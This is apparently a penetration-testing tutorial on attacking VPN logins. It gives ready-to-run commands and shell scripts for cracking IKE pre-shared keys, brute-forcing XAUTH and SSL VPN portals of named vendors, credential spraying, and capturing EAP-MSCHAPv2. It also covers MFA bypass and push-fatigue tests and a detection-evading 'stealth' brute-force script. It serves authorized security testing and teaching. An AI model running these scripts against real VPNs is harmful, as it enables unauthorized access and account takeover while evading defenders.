# VPN Credential Brute Force Guide

> Comprehensive guide to VPN credential brute force attacks, covering IKE aggressive mode PSK cracking, XAUTH credential testing, SSL VPN portal brute force, IKEv2 EAP authentication attacks, VPN credential spraying techniques, and MFA bypass strategies for authorized penetration testing.

## Introduction

VPN credential brute force attacks target the authentication mechanisms that guard VPN access. Unlike network-level exploits that target protocol vulnerabilities, credential attacks systematically test username/password combinations, pre-shared keys, or certificate patterns to gain unauthorized access. These attacks are effective because VPN authentication often relies on shared secrets or user-chosen passwords that may be weak, reused, or poorly managed.

The attack surface for VPN credential testing is broad. IPSec VPNs use pre-shared keys (PSK) during IKE negotiation that can be captured in aggressive mode and cracked offline. XAUTH adds a secondary username/password layer on top of IKE that can be brute-forced online. SSL VPN portals expose web login forms that are susceptible to standard web application brute force techniques. IKEv2 deployments using EAP-MSCHAPv2 are vulnerable to challenge-response capture and offline cracking. Each authentication mechanism requires different tools and techniques.

Credential spraying -- testing a small set of common passwords against many accounts -- is particularly effective against VPN portals because organizations rarely implement account lockout policies on VPN concentrators, fearing they would lock out legitimate remote workers. MFA adds a layer of protection but can be bypassed through implementation flaws, race conditions, or social engineering.

**Learning objectives**:

- Capture and crack IKE aggressive mode pre-shared keys
- Perform XAUTH credential brute force against IPSec VPNs
- Brute force SSL VPN portal authentication
- Execute credential spraying campaigns against VPN infrastructure
- Assess IKEv2 EAP-MSCHAPv2 authentication security
- Identify and test MFA bypass techniques
- Implement rate limiting and stealth during credential testing
- Document findings with remediation recommendations

**Prerequisites**: Familiarity with VPN protocols (IPSec/IKE, SSL VPN, OpenVPN). Understanding of authentication mechanisms (PSK, XAUTH, EAP, MFA). Experience with brute force tools (hydra, hashcat, ikeforce). Access to a test VPN environment.

---

## Practical Steps

### Step 1: IKE Aggressive Mode PSK Capture and Cracking

IKE aggressive mode transmits the pre-shared key hash in cleartext, allowing offline cracking. This is the most efficient VPN credential attack because it requires only a single packet exchange.

**Aggressive Mode Detection**

```bash
# Check if the VPN gateway supports aggressive mode
ike-scan -M --aggressive --trans='5,1,2,2' --id=vpn 192.168.1.1

# Try common VPN identifiers (group names)
for id in vpn group1 cisco remote access roadwarrior default ipsec; do
  result=$(ike-scan -M --aggressive --trans='5,1,2,2' --id=$id 192.168.1.1 2>/dev/null)
  if echo "$result" | grep -q "SA"; then
    echo "[+] Aggressive mode works with ID: $id"
    echo "$result"
  fi
done

# Enumerate with multiple transform sets
for trans in '5,1,2,2' '5,2,2,2' '5,1,1,2' '5,1,2,14' '5,1,2,5'; do
  ike-scan -M --aggressive --trans=$trans --id=vpn 192.168.1.1 2>/dev/null | grep -q "SA" && \
    echo "[+] Transform accepted: $trans"
done
```

**PSK Hash Capture**

```bash
# Capture aggressive mode PSK hash
ike-scan -M --aggressive --trans='5,1,2,2' --id=vpn --pskcrack 192.168.1.1 > psk_hash.txt

# The output contains the PSK hash in a format suitable for cracking
cat psk_hash.txt

# Alternative capture method using ikeforce
python3 ikeforce.py 192.168.1.1 -e -t 5 -s 1 -p 2 -r group_names.txt

# Capture from network traffic if an aggressive mode exchange is already occurring
sudo tcpdump -i any -nn 'udp port 500 and udp[8:1] = 0x30' -w aggressive.pcap
# Extract hash from capture
tshark -r aggressive.pcap -Y "isakmp.ike_type == 2" -V 2>/dev/null | grep -A 5 "Key Exchange"
```

**Offline PSK Cracking**

```bash
# Crack with ikecrack
ikecrack -p psk_hash.txt -w /usr/share/wordlists/rockyou.txt

# Convert to hashcat format for GPU-accelerated cracking
# IKE PSK hash format for hashcat: mode 5300 (PSK)
# Manual conversion may be needed depending on capture format

# Crack with hashcat (IKE PSK mode)
hashcat -m 5300 psk_hash_hashcat.txt /usr/share/wordlists/rockyou.txt

# Dictionary attack with custom wordlists
# Generate VPN-specific wordlist
cat > vpn_wordlist.txt << 'EOF'
vpn
password
cisco
ipsec
admin
123456
letmein
welcome
VPNP@ss
VPNP@ssw0rd
Spring2024
Summer2024
Winter2024
CompanyVPN1
IPSec_Key!
EOF

ikecrack -p psk_hash.txt -w vpn_wordlist.txt

# Rule-based expansion of common VPN passwords
hashcat -m 5300 psk_hash_hashcat.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

### Step 2: XAUTH Credential Brute Force

XAUTH provides a secondary username/password authentication on top of IKE Phase 1. After the IKE tunnel is established with the PSK, XAUTH requires valid credentials.

**XAUTH Enumeration**

```bash
# Test for XAUTH requirement
ike-scan -M --aggressive --trans='5,1,2,2' --id=vpn 192.168.1.1
# If response includes XAUTH attributes, the VPN requires XAUTH

# Check XAUTH support in vpnc
vpnc --long-help 2>&1 | grep -i xauth

# Test XAUTH with known PSK
cat > /tmp/xauth_test.conf << 'EOF'
IKE DH Group dh2
IKE Cipher aes256
IKE Hash sha1
IPSec Cipher aes256
IPSec Hash sha1
Domain vpn
Vendor cisco
Host 192.168.1.1
AuthType psk
Group vpn
GroupPassword <cracked_psk>
Xauth username test
Xauth password test
EOF

# Attempt connection
vpnc /tmp/xauth_test.conf --debug 3 2>&1 | grep -i "xauth\|auth\|fail\|success"
```

**XAUTH Brute Force with ikeforce**

```bash
# ikeforce XAUTH brute force with known PSK
python3 ikeforce.py 192.168.1.1 -b -t 5 -s 1 -p 2 \
  -u admin -w passwords.txt \
  --psk <cracked_psk> --id vpn

# Brute force multiple usernames
for user in admin root guest vpnuser operator support; do
  echo "[*] Testing user: $user"
  python3 ikeforce.py 192.168.1.1 -b -t 5 -s 1 -p 2 \
    -u $user -w passwords.txt \
    --psk <cracked_psk> --id vpn 2>&1 | grep -i "found\|success\|valid"
done

# XAUTH brute force with delay for stealth
python3 ikeforce.py 192.168.1.1 -b -t 5 -s 1 -p 2 \
  -u admin -w passwords.txt \
  --psk <cracked_psk> --id vpn \
  --delay 2000  # 2 second delay between attempts
```

### Step 3: SSL VPN Portal Brute Force

SSL VPN portals expose web login forms that can be brute-forced using standard web application testing tools.

**Portal Identification**

```bash
# Identify SSL VPN vendor and login endpoint
curl -k -s -I https://192.168.1.1/ | grep -i "server\|set-cookie"

# Common SSL VPN login URLs by vendor:
# Fortinet FortiGate: /remote/logincheck
# Pulse Secure: /dana-na/auth/url_default/welcome.cgi
# Palo Alto GlobalProtect: /global-protect/getconfig.esp
# Cisco ASA: +CSCOE+/logon.html
# SonicWall: /cgi-bin/sslvpnlogin
# Sophos: /userportal/webpages/myaccount/login.xhtml

# Test each endpoint
for path in "/remote/logincheck" "/dana-na/auth/url_default/welcome.cgi" \
  "/global-protect/getconfig.esp" "+CSCOE+/logon.html"; do
  code=$(curl -k -s -o /dev/null -w "%{http_code}" "https://192.168.1.1${path}")
  echo "$path -> HTTP $code"
done
```

**Hydra-Based Portal Brute Force**

```bash
# Fortinet FortiGate SSL VPN brute force
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form \
  "/remote/logincheck:username=^USER^&password=^PASS^:Invalid"

# Pulse Secure brute force
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form \
  "/dana-na/auth/url_default/welcome.cgi:user=^USER^&pass=^PASS^:failed"

# Palo Alto GlobalProtect brute force
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form \
  "/ssl-vpn/login.esp:prot=https&server=&inputStr=&j_username=^USER^&j_password=^PASS^&ok=Log+In:failed"

# Cisco ASA brute force
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form \
  "+CSCOE+/logon.html:username=^USER^&password=^PASS^&Login=Login:Login failed"

# Custom brute force with curl for complex login flows
cat > ssl_vpn_brute.sh << 'SCRIPT'
#!/bin/bash
TARGET="192.168.1.1"
USER="admin"
WORDLIST="passwords.txt"
DELAY=2  # seconds between attempts

while IFS= read -r pass; do
  # Fortinet login request
  response=$(curl -k -s -c cookies.txt \
    "https://${TARGET}/remote/logincheck" \
    -d "username=${USER}&password=${pass}&ajax=1" 2>/dev/null)
  
  if echo "$response" | grep -qi "welcome\|dashboard\|ret=1"; then
    echo "[+] SUCCESS: ${USER}:${pass}"
    echo "$response"
    exit 0
  elif echo "$response" | grep -qi "lock\|block\|ban\|too many"; then
    echo "[-] LOCKOUT DETECTED after password: $pass"
    echo "[-] Waiting 300 seconds before continuing..."
    sleep 300
  else
    echo "[-] Failed: ${USER}:${pass}"
  fi
  
  sleep $DELAY
done < "$WORDLIST"
SCRIPT
chmod +x ssl_vpn_brute.sh
```

### Step 4: VPN Credential Spraying

Credential spraying tests a small number of common passwords against many accounts, exploiting password reuse and weak password policies without triggering per-account lockouts.

**Credential Spraying Strategy**

```bash
# Generate target username list
# Common corporate username patterns:
# first.last, flast, firstlast, first_lastname, f.last
cat > usernames.txt << 'EOF'
admin
administrator
root
vpn
vpnuser
remote
guest
operator
service
backup
support
helpdesk
jsmith
john.smith
j.smith
mjones
mary.jones
m.jones
EOF

# Common VPN passwords for spraying (avoid account lockouts)
cat > spray_passwords.txt << 'EOF'
Password1
Welcome1
Summer2024!
Winter2024!
Spring2024!
Company2024!
Vpn2024!
Changeme1
Password123!
Qwerty123!
EOF

# Spray against SSL VPN portal
cat > credential_spray.sh << 'SCRIPT'
#!/bin/bash
TARGET="192.168.1.1"
DELAY=5  # 5 seconds between attempts to avoid detection
LOCKOUT_THRESHOLD=3  # stop if lockout detected

for pass in $(cat spray_passwords.txt); do
  echo "[*] Spraying password: $pass"
  lockout_count=0
  
  for user in $(cat usernames.txt); do
    response=$(curl -k -s -o /dev/null -w "%{http_code}" \
      "https://${TARGET}/remote/logincheck" \
      -d "username=${user}&password=${pass}" 2>/dev/null)
    
    if [ "$response" = "200" ]; then
      # Check if login actually succeeded vs failed with 200
      body=$(curl -k -s "https://${TARGET}/remote/logincheck" \
        -d "username=${user}&password=${pass}" 2>/dev/null)
      if echo "$body" | grep -qi "welcome\|dashboard\|ret=1"; then
        echo "[+] SUCCESS: ${user}:${pass}"
        echo "${user}:${pass}" >> valid_credentials.txt
      fi
    elif [ "$response" = "403" ] || [ "$response" = "429" ]; then
      echo "[-] Rate limited or blocked: HTTP $response"
      lockout_count=$((lockout_count + 1))
      if [ $lockout_count -ge $LOCKOUT_THRESHOLD ]; then
        echo "[-] Lockout threshold reached. Waiting 600 seconds..."
        sleep 600
        lockout_count=0
      fi
    fi
    
    sleep $DELAY
  done
  
  # Wait between password rounds to avoid detection
  echo "[*] Waiting 300 seconds before next password..."
  sleep 300
done
SCRIPT
chmod +x credential_spray.sh
```

### Step 5: IKEv2 EAP Authentication Attacks

IKEv2 deployments using EAP-MSCHAPv2 are vulnerable to challenge-response capture and offline cracking, similar to how NTLM hashes can be cracked.

**EAP-MSCHAPv2 Challenge Capture**

```bash
# Capture IKEv2 EAP-MSCHAPv2 exchange
sudo tcpdump -i any -nn 'udp port 500 or udp port 4500' -w eap_capture.pcap

# Initiate IKEv2 EAP connection (requires valid Phase 1 credentials)
# Using strongswan to trigger EAP exchange
cat > /etc/swanctl/swanctl_eap.conf << 'EOF'
connections {
    eap-test {
        remote_addrs = 192.168.1.1
        local {
            auth = eap-mschapv2
            eap_id = testuser
        }
        remote {
            auth = pubkey
        }
        children {
            test {
                remote_ts = 10.0.0.0/24
            }
        }
    }
}
EOF

# Attempt connection to capture EAP exchange
sudo swanctl --load-all && sudo swanctl --initiate --child test 2>&1 | tee eap_output.txt

# Analyze captured EAP exchange
tshark -r eap_capture.pcap -Y "eap" -V 2>/dev/null | \
  grep -A 10 "MS-CHAPv2\|Authenticator\|Challenge"
```

**Offline EAP-MSCHAPv2 Cracking**

```bash
# Extract MS-CHAPv2 challenge-response from capture
# The challenge-response format for hashcat mode 5500

# Format: username:::authenticator challenge:response
# Extract from tshark output and format for hashcat

# Crack with hashcat (mode 5500 for EAP-MSCHAPv2)
hashcat -m 5500 eap_hash.txt /usr/share/wordlists/rockyou.txt

# Alternative: convert to NetNTLMv1/v2 format and crack
# EAP-MSCHAPv2 uses the same algorithm as NTLMv2
hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt
```

### Step 6: MFA Bypass Testing

Multi-factor authentication adds a layer of protection, but implementation flaws can be exploited to bypass MFA requirements.

**MFA Implementation Flaw Testing**

```bash
# Test 1: Direct page access after primary authentication
# Authenticate with primary credentials
curl -k -c session.txt https://192.168.1.1/remote/logincheck \
  -d "username=admin&password=admin123"

# Skip MFA page entirely
curl -k -b session.txt https://192.168.1.1/remote/home -o response.html
grep -i "welcome\|dashboard" response.html
# If dashboard loads, MFA is not enforced at the server level

# Test 2: API endpoint bypass
# Some VPN portals have API endpoints that don't enforce MFA
curl -k -b session.txt https://192.168.1.1/remote/fortisslvpn -o vpn_config.txt
curl -k -b session.txt https://192.168.1.1/api/v1/system/status -o api_response.txt

# Test 3: Remember-me / trusted device bypass
# Many VPNs allow "trust this device" which creates a persistent cookie
curl -k -c trusted.txt https://192.168.1.1/remote/logincheck \
  -d "username=admin&password=admin123&trustcookie=1"

# Check if the trusted cookie persists without MFA
curl -k -b trusted.txt https://192.168.1.1/remote/home -o trusted_response.html
grep -i "welcome\|dashboard" trusted_response.html

# Test 4: Session fixation
# Set a known session cookie before authentication
curl -k -c fixed_session.txt -b "DSID=attacker_controlled_value" \
  https://192.168.1.1/remote/logincheck \
  -d "username=admin&password=admin123"

# Test 5: Timing-based MFA bypass
# Some implementations have race conditions where the session is valid
# for a brief window after primary auth before MFA is enforced
for i in $(seq 1 10); do
  curl -k -c "session_${i}.txt" https://192.168.1.1/remote/logincheck \
    -d "username=admin&password=admin123" &
  
  sleep 0.1
  
  curl -k -b "session_${i}.txt" https://192.168.1.1/remote/home \
    -o "race_${i}.html" 2>/dev/null
  grep -qi "welcome" "race_${i}.html" && echo "[+] Race condition success on attempt $i"
done
wait
```

**Push Notification Fatigue Testing**

```bash
# Test for MFA push fatigue (bombard user with push notifications)
# Some MFA implementations allow unlimited push notifications
# Users may eventually accept one to stop the notifications

# Send repeated authentication attempts to trigger push notifications
for i in $(seq 1 20); do
  curl -k -s -o /dev/null -w "Attempt $i: HTTP %{http_code}\n" \
    https://192.168.1.1/remote/logincheck \
    -d "username=target_user&password=known_password"
  sleep 5
done

# Check if push rate limiting is implemented
# If all 20 attempts trigger a push notification, the system is vulnerable
```

### Step 7: Stealth and Rate Limiting

Credential testing generates significant noise. Implementing proper rate limiting and stealth techniques reduces the chance of detection.

```bash
# Stealth credential testing framework
cat > stealth_vpn_brute.sh << 'SCRIPT'
#!/bin/bash
TARGET="192.168.1.1"
USER="admin"
WORDLIST="passwords.txt"
MAX_ATTEMPTS_PER_HOUR=30
JITTER_MAX=10  # maximum random delay in seconds

attempts=0
start_time=$(date +%s)

while IFS= read -r pass; do
  # Rate limiting check
  current_time=$(date +%s)
  elapsed=$((current_time - start_time))
  
  if [ $elapsed -lt 3600 ] && [ $attempts -ge $MAX_ATTEMPTS_PER_HOUR ]; then
    wait_time=$((3600 - elapsed))
    echo "[*] Rate limit reached. Waiting ${wait_time} seconds..."
    sleep $wait_time
    attempts=0
    start_time=$(date +%s)
  fi
  
  # Random jitter
  jitter=$((RANDOM % JITTER_MAX))
  sleep $jitter
  
  # Randomized user agent
  agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
    "Mozilla/5.0 (X11; Linux x86_64)"
  )
  agent=${agents[$RANDOM % ${#agents[@]}]}
  
  # Attempt login
  response=$(curl -k -s -A "$agent" -o /dev/null -w "%{http_code}" \
    "https://${TARGET}/remote/logincheck" \
    -d "username=${USER}&password=${pass}" \
    --connect-timeout 10)
  
  echo "[$(date '+%H:%M:%S')] ${USER}:${pass} -> HTTP $response"
  
  attempts=$((attempts + 1))
done < "$WORDLIST"
SCRIPT
chmod +x stealth_vpn_brute.sh
```

---

## Hands-on Exercises

### Exercise 1: IKE Aggressive Mode PSK Cracking

**Scenario**: A VPN gateway is identified as supporting IKE aggressive mode. Capture and crack the pre-shared key.

1. Enumerate supported IKE transforms and identify aggressive mode
2. Test common VPN identifiers to find a valid group name
3. Capture the PSK hash using ike-scan with --pskcrack
4. Crack the hash using ikecrack and a custom wordlist
5. Validate the cracked PSK by establishing a VPN connection
6. Document the complete attack chain with timing

**Expected outcome**: Successfully cracked PSK and established VPN connection. Documentation of the attack timeline, tools used, and the specific weaknesses that made the attack possible (aggressive mode enabled, weak PSK).

### Exercise 2: SSL VPN Credential Spraying

**Scenario**: A corporate SSL VPN portal is identified. Perform a credential spraying attack to identify weak credentials.

1. Identify the VPN vendor and login endpoint
2. Generate a targeted username list based on corporate naming conventions
3. Create a spray password list of 10 common corporate passwords
4. Implement rate limiting to avoid detection and lockouts
5. Execute the spray campaign over a 4-hour window
6. Validate any discovered credentials
7. Document the spray methodology and results

**Expected outcome**: Identification of any accounts with weak passwords. A report documenting the spray parameters (timing, rate limiting, detection avoidance) and recommendations for stronger password policies and MFA implementation.

### Exercise 3: MFA Bypass Assessment

**Scenario**: A VPN portal requires MFA for all users. Assess the MFA implementation for bypass vulnerabilities.

1. Test direct page access after primary authentication (MFA skip)
2. Test API endpoints for MFA enforcement gaps
3. Test remember-me / trusted device functionality
4. Test for race conditions in MFA enforcement
5. Test for MFA push fatigue (rate limiting on push notifications)
6. Test session management (session timeout, concurrent sessions)
7. Document all MFA bypass vectors with exploitation steps

**Expected outcome**: A comprehensive MFA bypass assessment report covering all tested vectors. For each finding, include: the attack technique, the result (bypassed or blocked), the impact if exploited, and the recommended remediation.

---

## References

1. **IKE Scanner (ike-scan)**: https://github.com/royhills/ike-scan -- IKE enumeration and PSK cracking
2. **IKEForce**: https://github.com/SpiderLabs/ikeforce -- IKE brute force tool
3. **Hydra**: https://github.com/vanhauser-thc/thc-hydra -- Online credential brute force
4. **Hashcat**: https://hashcat.net/hashcat/ -- GPU-accelerated offline hash cracking
5. **MITRE ATT&CK T1110 - Brute Force**: https://attack.mitre.org/techniques/T1110/ -- Credential brute force techniques
6. **MITRE ATT&CK T1110.003 - Password Spraying**: https://attack.mitre.org/techniques/T1110/003/ -- Credential spraying
7. **NIST SP 800-63B - Digital Identity Guidelines**: https://pages.nist.gov/800-63-3/sp800-63b.html -- Authentication security guidelines
8. **HackTricks - VPN Pentesting**: https://book.hacktricks.xyz/pentesting/pentesting-ipsec-ike-vpn -- VPN attack techniques
9. **CISA Advisory - VPN Security**: https://www.cisa.gov/news-events/cybersecurity-advisories -- VPN security advisories
